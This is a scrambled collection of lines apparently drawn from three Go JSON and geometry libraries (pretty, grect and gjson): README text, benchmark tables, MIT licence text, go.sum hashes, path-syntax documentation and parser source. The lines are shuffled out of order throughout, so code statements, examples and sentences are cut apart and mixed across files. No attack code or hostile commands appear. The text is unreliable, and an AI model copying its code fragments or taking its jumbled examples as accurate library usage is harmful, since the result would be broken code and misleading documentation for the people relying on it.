Pretty is a Go package that provides [fast](
"The second param is used for a customizing the style, and passing nil will use the default "
"These benchmarks were run on a MacBook Pro 15"" 2.8 GHz Intel Core i7 using Go 1.7."
// SortKeys will sort the keys alphabetically
There's a 
$ go get -u github.com/tidwall/pretty
Will add color to the result for printing to the terminal.
pretty.TerminalStyle
// Width is an max column width for single line arrays
"""fav.movie"": ""Deer Hunter"", ""friends"": ["
This will retrieve the library.
"To start using Pretty, install Go and run "
 Ugly
"PrettyOptions(json, opts)"
// Default is two spaces
 Indent/Compact methods.
"  ""name"": {"
    }
[![GoDoc](https://img.shields.io/badge/api-reference-blue.svg
BenchmarkPretty-8            1000000     1283 ns/op      720 B/op      2 allocs/op
"result = pretty.Color(json, nil)"
Color will colorize the json for outputing to the screen. 
// Default is 80
Indent string
Getting Started
result = pretty.Pretty(example)
 Color
[![Coverage Status](https://img.shields.io/badge/coverage-100%25-brightgreen.svg
 Installing
BenchmarkUglyInPlace-8       5000000      340 ns/op        0 B/op      0 allocs/op
"  },"
// Default is an empty string
// Prefix is a prefix for all lines
Using this example:
 License
json
go get
"  ""fav.movie"": ""Deer Hunter"","
Will format the json to:
style=flat-square)](http://gocover.io/github.com/tidwall/pretty)
The following code:
Josh Baker [@tidwall](http://twitter.com/tidwall)
"    ""first"": ""Tom"","
"  ""children"": [""Sara"", ""Alex"", ""Jack""],"
"{""name"":  {""first"":""Tom"",""last"":""Anderson""},  ""age"":37,"
Pretty source code is available under the MIT [License](/LICENSE).
    {
style=flat-square)](https://travis-ci.org/tidwall/prettty)
"performance) methods for formatting JSON for human readability, or to compact JSON for smaller payloads."
result = pretty.Ugly(example)
style=flat-square)](https://godoc.org/github.com/tidwall/pretty) 
BenchmarkJSONIndent-8         300000     4628 ns/op     1069 B/op      4 allocs/op
"      ""age"": 44"
"  ""age"": 37,"
"{""name"":{""first"":""Tom"",""last"":""Anderson""},""age"":37,""children"":[""Sara"",""Alex"",""Jack""],""fav.movie"":""Deer Hunter"",""friends"":[{""first"":""Janet"",""last"":""Murphy"",""age"":44}]}"
===============
"    {""first"": ""Janet"", ""last"": ""Murphy"", ""age"": 44}"
"  ""friends"": ["
copies or substantial portions of the Software.
"this software and associated documentation files (the ""Software""), to deal in"
"the Software, and to permit persons to whom the Software is furnished to do so,"
"Permission is hereby granted, free of charge, to any person obtaining a copy of"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS"
"use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of"
"COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER"
The MIT License (MIT)
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN"
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"the Software without restriction, including without limitation the rights to"
Copyright (c) 2017 Josh Baker
language: go
"return min, max, len(s)"
if i > 0 {
"func getWKTAny(s string, i int) (min, max []float64, ri int) {"
case ')':
"return min, min"
if i >= len(min1) {
diff = true
"pieces := strings.Split(part[1:len(part)-1], "" "")"
"n', ',':"
"func getWKTGeometryCollection(s string, i int) (min, max []float64, ri int) {"
"for i, v := range r.Max {"
 s[i] == ')' {
part = strings.TrimSpace(part)
"return min, max, i"
for 
end_early:
default:
ni = 0
 i < len(parts) 
ws = true
"min = make([]float64, 0, len(pieces))"
if n < min[idx] {
idx = 0
if s[i] == ']' {
next:
if depth == 0 {
"max = make([]float64, 0, len(pieces))"
"max = append(max, n)"
"max = append(max, min[len(max):]...)"
"buf = append(buf, ']')"
done:
if ni == 0 {
"""strconv"""
"min, max = getMinMaxBrackets(gjson.Get(json, ""coordinates"").Raw)"
depth
"min, max, i = getGeoJSON(s, i)"
"return parseWKB(s, i)"
if len(part) >= 2 
ni = i
"""strings"""
"parts := strings.Split(a, "","")"
 i < 2
"func getMinMaxBrackets(s string) (min, max []float64) {"
"Min, Max []float64"
"buf = append(buf, strconv.FormatFloat(v, 'f', -1, 64)...)"
if idx >= len(min) {
 i < len(min1) 
match = false
"buf = append(buf, ' ')"
return string(buf)
if len(max) < len(min) {
if !diff {
if min1[i] < min2[i] {
"case ""GeometryCollection"":"
"umin = append(umin, min2[i])"
"return min, max"
"umax = append(umax, max1[i])"
piece := pieces[j]
// normalize
// do not increment the index
"min, max = union(min, max, nmin, nmax)"
} else if s[i] == ')' {
"min2, max2, i = getWKT(s, i)"
for j := 0
type Rect struct {
 i < len(r.Min)
continue
if r.Min[i] != r.Max[i] {
a := s[i:]
json := s[i:]
var depth int
"buf = append(buf, ']', ',', '[')"
"t', '"
"func getGeoJSON(s string, i int) (min, max []float64, ri int) {"
} else if n > max[idx] {
} else {
"min[i], max[i] = max[i], min[i]"
"return Rect{Min: min, Max: max}"
var i int
break
"min = append(min, max[len(min):]...)"
max = min
"for i, v := range r.Min {"
"func union(min1, max1, min2, max2 []float64) (umin, umax []float64) {"
} else if i >= len(min2) {
if diff {
"return getWKTAny(s, i)"
"umax = append(umax, max2[i])"
"n, _ := strconv.ParseFloat(s[ni:i], 64)"
import (
break loop
"r', '"
"var min, max []float64"
"if piece != """" {"
"buf = append(buf, '[')"
package grect
} else if len(max) != len(min) {
var ws bool
"case 0x00, 0x01:"
"case ')', ' ', '"
"case ',':"
if ni > 0 {
if min[i] > max[i] {
"min, max = normalize(min, max)"
if len(parts) == 1 {
depth--
"min, max, _ = getGeoJSON(gjson.Get(json, ""geometry"").String(), 0)"
"nmin, nmax, _ := getGeoJSON(json.String(), 0)"
"return nil, nil, i"
case '[':
"func getRect(s string, i int) (min, max []float64, ri int) {"
diff := len(r.Min) != len(r.Max)
if len(max) == 0 {
for i := 0
"min, max, i = getRect(s, i)"
if len(s)-i < 18 {
"min = append(min, n)"
func (r Rect) String() string {
goto next
"case ""Feature"":"
switch s[i] {
func Get(s string) Rect {
"if s[i] == ',' {"
"var min2, max2 []float64"
"case '[', ',', ']', ' ', '"
if !ws {
 (part[0] <= ' ' 
 j < len(pieces)
// just copy min1
var ni int
var idx int
"n, _ := strconv.ParseFloat(piece, 64)"
"if s[i] == ',' "
 part[len(part)-1] == ']' {
min[idx] = n
"return min, max, len(json)"
 i < len(min)
"""github.com/tidwall/gjson"""
max[idx] = n
"case 'p', 'P', 'l', 'L', 'm', 'M', 'g', 'G':"
if len(part) > 0 
"min, max, i = getWKT(s, i)"
"umin = append(umin, min1[i])"
if i == 0 {
if match {
"case 'g', 'G':"
"return getWKTGeometryCollection(s, i"
} else if len(min) < len(max) {
case '{':
"case ' ', '"
 part[0] == '[' 
"min, max = union(min, max, min2, max2)"
case '(':
 i < len(s)
 i < len(min2)
// just copy min2
loop:
if max1[i] > max2[i] {
"func normalize(min, max []float64) (nmin, nmax []float64) {"
goto end_early
"return umin, umax"
"case ""FeatureCollection"":"
goto done
"func getWKT(s string, i int) (min, max []float64, ri int) {"
// just balance the parens
if min[i] != max[i] {
part := parts[i]
if s[i] == '(' {
if s[i] == ')' {
match := true
 part[len(part)-1] <= ' ') {
return
"switch gjson.Get(json, ""type"").String() {"
var buf []byte
"min, max = make([]float64, 0, 4), make([]float64, 0, 4)"
if ni != 0 {
"for _, json := range gjson.Get(json, ""geometries"").Array() {"
"for _, json := range gjson.Get(json, ""features"").Array() {"
GRECT
"      ""type"": ""Polygon"","
"n"", r.Min, r.Max)"
"        [ [100.0, 0.0], [101.0, 0.0], [101.0, 1.0],"
 Contact
// Output:
GRECT source code is available under the MIT [License](/LICENSE).
"          [100.0, 1.0], [100.0, 0.0] ]"
 License
====
"Quickly get the outer rectangle for GeoJSON, WKT, WKB."
    }
        ]
Josh Baker [@tidwall](http://twitter.com/tidwall)
r := grect.Get(
"fmt.Printf(""%v %v"
// [100 0] [101 1]
"      ""coordinates"": ["
copies or substantial portions of the Software.
"this software and associated documentation files (the ""Software""), to deal in"
"the Software, and to permit persons to whom the Software is furnished to do so,"
Copyright (c) 2016 Josh Baker
"Permission is hereby granted, free of charge, to any person obtaining a copy of"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS"
"use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of"
"COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER"
The MIT License (MIT)
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN"
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"the Software without restriction, including without limitation the rights to"
parseContext) {
return []byte(s)
func bytesString(b []byte) string {
return string(b)
"return Get(string(json), path)"
package gjson
"func fillIndex(json string, c "
"func getBytes(json []byte, path string) Result {"
// noop. Use zero for the Index value.
build appengine js
func stringBytes(s string) []byte {
json-lines).
$ go get -u github.com/tidwall/gjson
"For example, using the built-in "
BenchmarkJSONUnmarshalMap-8           600000       9019 ns/op       3048 B/op        69 allocs/op
"float64, for JSON numbers"
"      ""src"": ""Images/Sun.png"","
Result
Arrays and Objects are returned as their raw json types. 
 Path Syntax
"      ""lastName"": ""Harold"", "
"  ""programmers"": ["
You can also query an array for the first match by using 
. Queries support the 
performance) and [simple](
"iterate-through-an-object-or-array), and [parsing json lines]("
[]Result
 brackets. This was
 Iterate through an object or array
BenchmarkJSONParserGet-8             3000000        499 ns/op         21 B/op         0 allocs/op
matches with 
BenchmarkEasyJSONLexer-8             3000000        887 ns/op        613 B/op         6 allocs/op
"(==""fb""))"
"get-multiple-values-at-once) function to get multiple values at once, and [GetBytes]("
"      ""name"": ""main_window"","
".first""    >> [""Dale"",""Roger"",""Jane""]"
BenchmarkJSONDecoder-8                300000      14120 ns/op       4224 B/op       184 allocs/op
friends.
if !gjson.Valid(json) {
 function returns an 
"""children.1""         >> ""Alex"""
ForEach
"ildren.0""         >> ""Sara"""
"path-syntax), [iteration]("
} else {
"    {""age"": 47, ""first"": ""Jane"", ""last"": ""Murphy""}"
 function will iterate through JSON lines.
".lastName"" like such:"
func main() {
"value := gjson.Get(json, ""name.last"")"
"result.ForEach(func(key, value gjson.Result) bool {"
"    ""debug"": ""on"","
"Multiple paths can be ""chained"" together using the pipe character. "
programmers.
"Please note that prior to v1.3.0, queries used the "
 Unmarshal to a map
result.Int() int64    // -9223372036854775808 to 9223372036854775807
result.Get(path string) Result
 function and you want to avoid converting 
result.Raw
"(last==""Murphy"")"
 Validate JSON
const json = 
"""age""                >> 37"
"Get(string(data), path)"
 will continue to work until the next major release.
GJSON supports the json types 
"    ""image"": { "
 License
result.Uint() int64   // 0 to 18446744073709551615
".movie""         >> ""Deer Hunter"""
"return errors.New(""invalid json"")"
"  ""name"": {""first"": ""Tom"", ""last"": ""Anderson""}"
 function returns back an array of values.
 Get multiple values at once
"result.ForEach(iterator func(key, value Result) bool)"
"{""name"":{""first"":""Janet"",""last"":""Prichard""},""age"":47}"
"@case:upper""           >> [""SARA"",""ALEX"",""JACK""]"
boolean >> bool
"    src=""logo.png"" "
(age>45)
"""fav"
get-a-value) way to get values from a json document.
or lower case.
(...)
[multipath](SYNTAX.md
".last            >> [""Craig"",""Murphy""]"
 Custom modifiers
widget.image.hOffset
"""child"
" prefix, which treats a multilined document as an array. "
we'll get 
widget.window.name
"  ""age"":37,"
"string, for JSON string literals"
result.Get(path)
===============
Suppose you want all the last names from the following json:
".first   >> [""Dale"",""Roger""]"
"  if arg == ""upper"" {"
"result.Type    // can be String, Number, True, False, Null, or JSON"
"  ""friends"": ["
BenchmarkGJSONUnmarshalMap-8          900000       4154 ns/op       1920 B/op        26 allocs/op
if !value.Exists() {
"[ffjson](https://github.com/pquerna/ffjson), "
"      ""hOffset"": 250,"
    return true
GJSON source code is available under the MIT [License](/LICENSE).
Please see [Pretty Options](https://github.com/tidwall/pretty
 Check for the existence of a value
"  ],"
"For example, the "
"(name=""May"").age   >> 57"
number
null    >> nil
"    {""age"": 44, ""first"": ""Dale"", ""last"": ""Murphy""},"
[...]
The return value is a 
return true // keep iterating
"      ""size"": 36,"
", then you can use this pattern:"
"m, ok := gjson.Parse(json).Value().(map[string]interface{})"
[]byte
 that will search a result.
There are currently three built-in modifiers:
"result := gjson.Get(json, ""programmers"")"
" equals zero, in which case the "
"You would use the path ""programmers."
".first   >> [""Dale"",""Jane""]"
"bool, for JSON booleans"
"      ""firstName"": ""Jason"", "
"  if arg == ""lower"" {"
widget.text.onMouseUp
" calls are capable of reading all 64 bits, allowing for large JSON integers."
 array and reverse the order:
result.Time() time.Time
result.Int() int64
 function can be used to get multiple values at the same time.
array   >> []interface{}
BenchmarkJSONIterator-8              3000000        812 ns/op        544 B/op         9 allocs/op
BenchmarkGJSONGet-8                  3000000        372 ns/op          0 B/op         0 allocs/op
"      ""vOffset"": 100,"
", and "
"gjson.ForEachLine(json, func(line gjson.Result) bool{"
"@reverse""  >> [""jack"",""alex"",""sara""]"
"Get searches json for the specified path. A path is in dot syntax, such as ""name.last"" or ""age"". When the value is found it's returned immediately. "
false
".lastName"")"
 Result Type
"Below is a quick overview of the path syntax, for more complete information please"
""").last        >> ""Craig"""
check out [GJSON Syntax](SYNTAX.md).
Prichard
"  ""fav.movie"": ""Deer Hunter"","
Parse(json)
result.Raw     // holds the raw json
"result.Less(token Result, caseSensitive bool) bool"
"    }, {"
"    {""first"": ""Dale"", ""last"": ""Murphy"", ""age"": 44, ""nets"": [""ig"", ""fb"", ""tw""]},"
"<a href=""https://travis-ci.org/tidwall/gjson""><img src=""https://img.shields.io/travis/tidwall/gjson.svg"
result.Str     // holds the string
children
' character.
Only the value is passed for arrays.
".name              >> [""Gilbert"",""Alexa"",""May"",""Deloise""]"
 modifier takes a json object as its argument. 
There's support for [JSON Lines](http://jsonlines.org/) using the 
 JSON Lines
"[jsonparser](https://github.com/buger/jsonparser),"
 and 
"      ""firstName"": ""Janet"", "
: Remove all whitespace from a json document.
 options are 
string  >> string
"result := gjson.GetBytes(json, path)"
var raw []byte
println(value.String())
The dot and wildcard characters can be escaped with '
"get-a-value), [dot notation paths]("
"if gjson.Get(json, ""name.last"").Exists() {"
"      ""width"": 500,"
 Simple Parse and Get
result.Bool() bool
"      ""onMouseUp"": ""sun1.opacity = (sun1.opacity / 100) "
println(name.String())
result.Map() map[string]gjson.Result
result.Value()
working-with-bytes) for working with JSON byte slices.
"style=flat-square"" alt=""GJSON Playground""></a>"
"To get the number of elements in an array or to access a child path, use the '"
object  >> map[string]interface{}
sortKeys
""").last         >> ""Murphy"""
You can also query an object inside an array:
 Performance
if result.Index > 0 {
"    ""text"": {"
if !ok {
comparison operators and the simple pattern matching 
" slice, there's the [GetBytes](https://godoc.org/github.com/tidwall/gjson"
  return json
result.Uint()
"      ""firstName"": ""Elliotte"", "
"results := gjson.GetMany(json, ""name.first"", ""name.last"", ""age"")"
    raw = json[result.Index:result.Index
@case:lower
" functions expects that the json is well-formed. Bad json will not panic, but it may return back unexpected results."
The 
json.
                   >> 4
document or just characters.
"  ""children"": [""Sara"",""Alex"",""Jack""],"
"For example, all of these will return the same result:"
result.Array()
map[string]interface{}
// not a map
A key may contain special wildcard characters '
number  >> float64
</p>
<br>
"(last==""Murphy"").first    >> ""Dale"""
 type holds one of these:
There's a 
"      ""style"": ""bold"","
interface{}
If you are consuming JSON from an unpredictable source then you may want to validate prior to using GJSON.
This will retrieve the library.
"gjson.Parse(json).Get(""name"").Get(""last"")"
"""friends."
    }
Each operation was rotated though one of the following search paths:
"      ""data"": ""Click Here"","
 is converted to a 
result.Num     // holds the float64 number
customized-output) for more information.
Getting Started
"  ""name"": {""first"": ""Tom"", ""last"": ""Anderson""},"
var json []byte = ...
", which will always contain exactly the same number of items as the input paths."
A path is a series of keys separated by a dot.
"If the result is not a JSON array, the return value will be an array containing one result."
"      ""title"": ""Sample Konfabulator Widget"","
"result.Index   // index of raw value in original json, zero means index unknown"
 Installing
"{""name"": ""Alexa"", ""age"": 34}"
"    ""window"": {"
null
json
"If the result represents a non-existent value, then an empty array will be returned."
    raw = []byte(result.Raw)
(not like) operators.
"println(""no last name"")"
"for _, name := range result.Array() {"
".2""           >> ""Jack"""
Returning 
Josh Baker [@tidwall](http://twitter.com/tidwall)
"{""name"": ""May"", ""age"": 57}"
"name := gjson.Get(json, "
To access an array value use the index as the key.
", or find all "
BenchmarkFFJSONLexer-8               1500000       3111 ns/op        896 B/op         8 allocs/op
and [json-iterator](https://github.com/json-iterator/go)
The full list of 
changed in v1.3.0 as to avoid confusion with the new
To directly access the value:
    {
"<a href=""http://tidwall.com/gjson-play""><img src=""https://img.shields.io/badge/%F0%9F%8F%90-playground-9900cc.svg"
"..1                   >> {""name"": ""Alexa"", ""age"": 34}"
: Make the json document more human readable.
string
Which makes the json pretty and orders all of its keys.
 Get nested array values
"multipaths) syntax. For backwards compatibility, "
"    {""age"": 68, ""first"": ""Roger"", ""last"": ""Craig""},"
Sometimes you just want to know if a value exists. 
The key and value are passed to the iterator function for objects.
result.Array() []gjson.Result
"result := gjson.Get(json, ""programmers."
To unmarshal to a 
width
You can also add custom modifiers.
    return strings.ToUpper(json)
    return strings.ToLower(json)
"Benchmarks of GJSON alongside [encoding/json](https://golang.org/pkg/encoding/json/), "
<img 
If you are using the 
package main
" function that will do a simple parse, and "
"0""         >> ""Jack"""
 Modifiers and path chaining 
"To start using GJSON, install Go and run "
Parse
"import ""github.com/tidwall/gjson"""
" modifier on the above json document,"
GJSON is a Go package that provides a [fast](
"Also check out [SJSON](https://github.com/tidwall/sjson) for modifying json, and the [JJ](https://github.com/tidwall/jj) command line tool."
"    {""first"": ""Jane"", ""last"": ""Murphy"", ""age"": 47, ""nets"": [""ig"", ""tw""]}"
result.Float() float64
 64-bit integers
 Get a value
"(lastName=""Hunter"").firstName"
"""children"
}    
 function allows for quickly iterating through an object or array. 
This will print:
This is useful for getting results from a modified query.
(nets.
bool
result.Value() interface{}
println(value.String()) 
"@pretty:{""sortKeys"":true} "
"@reverse""           >> [""Jack"",""Alex"",""Sara""]"
result.String() string
"<p align=""center"">get json values quickly</a></p>"
"style=flat-square"" alt=""Build Status""></a>"
 Contact
result.Int()
@ugly
This is a best-effort no allocation sub slice of the original json. This method utilizes the 
"""children."
"gjson.GetBytes(json, path)"
: Reverse an array or the members of an object.
// Or as one step
"These benchmarks were run on a MacBook Pro 15"" 2.8 GHz Intel Core i7 using Go 1.8 and can be be found [here](https://github.com/tidwall/gjson-benchmarks)."
"<a href=""https://godoc.org/github.com/tidwall/gjson""><img src=""https://img.shields.io/badge/api-reference-blue.svg"
"  ""widget"": {"
"..3                   >> {""name"": ""Deloise"", ""age"": 44}"
"      ""lastName"": ""Hunter"", "
result.Uint() uint64
 from an iterator will stop iteration.
If your JSON is contained in a 
"      ""alignment"": ""center"","
"gjson.AddModifier(""case"", func(json, arg string) string {"
"nil, for JSON null"
JSON document used:
"      ""lastName"": ""McLaughlin"", "
 Modifier arguments
"""         >> 3"
A modifier may accept an optional argument. The argument can be a valid JSON 
prefix
len(result.Raw)]
For example:
"""friends.1.last""     >> ""Craig"""
@pretty
"println(name.String())  // prints ""Elliotte"""
indent
"For example, here we create a modifier that makes the entire json document upper"
"style=flat-square"" alt=""GoDoc""></a>"
"    {""first"": ""Roger"", ""last"": ""Craig"", ""age"": 68, ""nets"": [""fb"", ""tw""]},"
ForEachLines
It has features such as [one line retrieval](
"println(""has a last name"")"
"<p align=""center"">"
go get
 Working with Bytes
 (like) and 
A modifier is a path component that performs custom processing on the 
"[EasyJSON](https://github.com/mailru/easyjson),"
"{""name"": ""Deloise"", ""age"": 44}"
New in version 1.2 is support for modifier functions and path chaining.
There are a variety of handy functions that work on a result:
"gjson.Get(json, ""name.last"")"
result.Exists() bool
"      ""vOffset"": 250,"
"gjson.Get(json, ""name"").Get(""last"")"
@reverse
 to a 
"    width=""240"" height=""78"" border=""0"" alt=""GJSON"">"
result.Index
There's also the [GetMany](
"{""name"": ""Gilbert"", ""age"": 61}"
GetMany
"""name.last""          >> ""Anderson"""
"(first%""D"
    println(line.String())
" field, which is the position of the raw data in the original json. It's possible that the value of "
' and '
GetBytes) function. This is preferred over 
"""children""           >> [""Sara"",""Alex"",""Jack""]"
"      ""alignment"": ""center"""
 which requires type assertion and is one of the following Go types:
"(first!%""D"
"      ""height"": 500"
"    },"
copies or substantial portions of the Software.
"this software and associated documentation files (the ""Software""), to deal in"
"the Software, and to permit persons to whom the Software is furnished to do so,"
Copyright (c) 2016 Josh Baker
"Permission is hereby granted, free of charge, to any person obtaining a copy of"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS"
"use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of"
"COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER"
The MIT License (MIT)
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN"
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"the Software without restriction, including without limitation the rights to"
pL9E=
sBenx6DDtFZJxhVysOjyk=
github.com/tidwall/pretty v1.0.0 h1:HsD
github.com/tidwall/match v1.0.1/go.mod h1:LujAq0jyVjBy028G1WhWfIzbpQfMO8bBZ6Tyb0
github.com/tidwall/match v1.0.1 h1:PnKP62LPNxHKTwvHHZZzdOAOCtsJTjo6dZLCwpKm5xc=
QiTn7sK6flMKIvNmpqz1qrpP3Ps6jOKIKMooyg4=
github.com/tidwall/pretty v1.0.0/go.mod h1:XNkn88O1ChpSDQmQeStsy
language: go
"children.1             ""Alex"""
first
 is the first index of the previous result.
 Multipaths
"For example, using the built-in "
sortKeys
"You'll notice that an optional key can be provided, in this case "
basic)
"    {""first"": ""Jane"", ""last"": ""Murphy"", ""age"": 47, ""nets"": [""ig"", ""tw""]}"
 Arrays
""")                 ""Alex"""
 path on each array element 
- [Escape Character](
"ildren.0             ""Sara"""
: Remove all whitespace from JSON.
Please see [Pretty Options](https://github.com/tidwall/pretty
".first     [""Dale"",""Jane""]"
arrays) and [Queries](
Use the [GJSON Playground](https://gjson.dev) to experiment with the syntax online.
".movie             ""Deer Hunter"""
"  ],"
"For example, the "
to form new documents. Wrapping comma-separated paths between 
".age         [44,68,47]"
A modifier is a path component that performs custom processing on the JSON.
" characters, and "
Here are some examples
"last name ""Murphy""."
"determined, then ""_"" is used."
(nets.
".last             [""Craig"",""Murphy""]"
  return json
You can also query an array for the first match by  using 
dot-vs-pipe)
"    {""age"": 44, ""first"": ""Dale"", ""last"": ""Murphy""},"
The following GJSON Paths evaluate to the accompanying values.
Nested queries are allowed.
"[""Dale"",""Jane""]"
wildcards)
after
This document is designed to explain the structure of a GJSON Path through examples.
 will match on any zero
 character allows for digging into JSON Arrays.
"(last==""Murphy"").first     ""Dale"""
[...]
""").last         ""Craig"""
"0         {""first"": ""Dale"", ""last"": ""Murphy"", ""age"": 44}"
"friends.0.first                     ""Dale"""
 Modifiers
"syntax. For backwards compatibility, "
 modifier takes a json object as its argument.
Queries support the 
 brackets. This was
- [Dot vs Pipe](
"Since the previous result is an array, not an object, it's not possible to process "
friends
The 
"Here we selected the first name, age, and the first name for friends with the "
".2               ""Jack"""
 Path structure
 character. 
"Yet, "
- [Queries](
"  ""children"": [""Sara"",""Alex"",""Jack""],"
"           [{""first"": ""Dale"", ""last"": ""Murphy"", ""age"": 44},{""first"": ""Jane"", ""last"": ""Murphy"", ""age"": 47}]"
"{name.first,age,""the_murphys"":friends."
"(==""fb""))"
"For example, here we create a modifier which makes the entire JSON payload upper or lower case."
"first                     ""Dale"""
@ugly
{...}
In many cases you'll just want to retreive values by object name or array index.
"children               [""Sara"",""Alex"",""Jack""]"
".first    [""Dale"",""Jane""]"
- [Wildcards](
There are currently three built-in modifiers:
friends.
: Make the JSON more human readable.
"Starting with v1.3.0, GJSON added the ability to join multiple paths together"
: Reverse an array or the members of an object.
A GJSON Path is a text string syntax that describes a search pattern for quickly retreiving values from a JSON payload.
 Example
The definitive implemenation is [github.com/tidwall/gjson](https://github.com/tidwall/gjson).  
Because 
"  if arg == ""lower"" {"
" comparison operators, "
changed in v1.3.0 as to avoid confusion with the new [multipath](
"    {""age"": 47, ""first"": ""Jane"", ""last"": ""Murphy""}"
"gjson.AddModifier(""case"", func(json, arg string) string {"
 suffix returns
Let's break down a few of these.
 does not exist.
A key may contain the special wildcard characters 
friends.0
children.
modifiers)
", or find all matches with "
 (not like) operators.
 all by itself results in
 Modifier arguments
"Please note that prior to v1.3.0, queries used the "
"[{""first"": ""Dale"", ""last"": ""Murphy"", ""age"": 44},{""first"": ""Jane"", ""last"": ""Murphy"", ""age"": 47}]"
customized-output) for more information.
"0.first                     ""Dale"""
", and "
 for [Arrays](
"  ""name"": {""first"": ""Tom"", ""last"": ""Anderson""},"
 can be escaped with 
prefix
"For example, using the given multipath "
"(last==""Murphy"")"
 GJSON Path Syntax
- [Basic](
"                 [""Sara"",""Jack""]"
".first  >> [""Dale"",""Roger""]"
path-structure)
         2
@pretty
 Escape character
.first
"""children.@case:upper""             [""SARA"",""ALEX"",""JACK""]"
                           3
 Wildcards
indent
The path 
" will result in a new array or object, respectively."
queries)
A GJSON Path is intended to be easily expressed as a series of components seperated by a 
The cases where
"""the_murphys"", to force assign a key to a value. Otherwise, the name of the "
"children.@reverse                   [""Jack"",""Alex"",""Sara""]"
"    {""first"": ""Roger"", ""last"": ""Craig"", ""age"": 68, ""nets"": [""fb"", ""tw""]},"
before
"(last=""Murphy"")"
         []
" character, there are a few more that have special meaning, including "
"children.0             ""Sara"""
 returning the results. Which becomes
Given this JSON
json
next major release.
"Special purpose characters, such as "
"  ""name"": {""first"": ""Tom"", ""last"": ""Anderson""}"
 Dot vs Pipe
"  ""fav.movie"": ""Deer Hunter"","
"""children.@case:lower.@reverse""    [""jack"",""alex"",""sara""]"
escape-character)
 (like) and 
Along with 
 modifier on the above JSON payload will reverse the 
""").last          ""Murphy"""
 matches on any one character.
 array:
              3
 or 
This results in
 suffix will process the 
.0         []
A modifier may accept an optional argument. The argument can be a valid JSON payload or just characters.
But the 
first     <non-existent>
"friends.1              {""first"": ""Roger"", ""last"": ""Craig"", ""age"": 68}"
"(!%"""
"    {""first"": ""Dale"", ""last"": ""Murphy"", ""age"": 44, ""nets"": [""ig"", ""fb"", ""tw""]},"
"name.first             ""Tom"""
@reverse
child
- [Path structure](
(age>45)
children
multipaths) 
- [Modifiers](
 the previous result. 
"To query for a non-object value in an array, you can forgo the string to the right of the operator."
To get the length of an array you'll just use the 
 differs from 
The full list of 
You can also add custom modifiers. 
"(first%""D"
"actual field will be used, in this case ""first"". If a name cannot be"
In most cases they both end up returning the same results.
 and 
"@pretty:{""sortKeys"":true}"
"children.@reverse.0                 ""Jack"""
(...)
 Basic 
"name.last              ""Anderson"""
 options are 
age                    37
Which makes the json pretty and orders all of its keys.
 Custom modifiers
 suffix actually processes the 
"    {""age"": 68, ""first"": ""Roger"", ""last"": ""Craig""},"
"{""first"": ""Dale"", ""last"": ""Murphy"", ""age"": 44}"
because 
"  ""age"":37,"
- [Arrays](
"friends.1.first        ""Roger"""
"(first!%""D"
width
    return strings.ToUpper(json)
    return strings.ToLower(json)
"{""first"":""Tom"",""age"":37,""the_murphys"":[""Dale"",""Jane""]}"
and the simple pattern matching 
 will continue to work until the
arrays)
queries). 
" is standard separator, but it's also possible to use a "
 Queries
 path 
"  if arg == ""upper"" {"
.first}
"  ""friends"": ["
 is when it's used after the 
 all by itself.
"res, _ := time.Parse(time.RFC3339, t.String())"
Raw string
 s[i] > 126 {
// prior to calling this function.
sign = true
arrch   bool
r.arrch = true
if c.json[i] > '
"b = append(b, ':')"
"//    ""friends"": ["
rpv = rpv[1 : len(rpv)-1]
"i, hit = parseArray(c, i"
"path, op, value, remain string, i int, ok bool,"
"assign(value, f)"
} else if a[i]
1 < len(path) 
"c.value.Num, _ = strconv.ParseFloat(val, 64)"
if json[i] == '{' 
if data[i] == '0' {
"n, ok := floatToInt(t.Num)"
"func modPretty(json, arg string) string {"
if i >= len(json) {
" t.Str != ""false"""
"var key, value Result"
c.value.Raw = string(jsons)
1] == 'l' 
"func parseSquash(json string, i int) (int, string) {"
//  {
return r.o
res.Type = String
"arrayPathResult, value Result) bool {"
"data, _ := base64.StdEncoding.DecodeString(jsval.String())"
if res.Exists() {
"rpvn, _ := strconv.ParseFloat(rpv, 64)"
// Bool returns an boolean representation.
pipe    string
32 > b[i] {
func (t Result) Get(path string) Result {
if v := reflect.ValueOf(v)
if hasArgs {
"return Get(t.Raw, path)"
a  []Result
// now try to parse the raw string
if json[i] <= ' ' 
switch key.String() {
pathOut = pathOut[idx:]
 query[0] != '
value.Type = False
"if procQuery(Result{Raw: val, Type: JSON}) {"
 path[i
all   bool
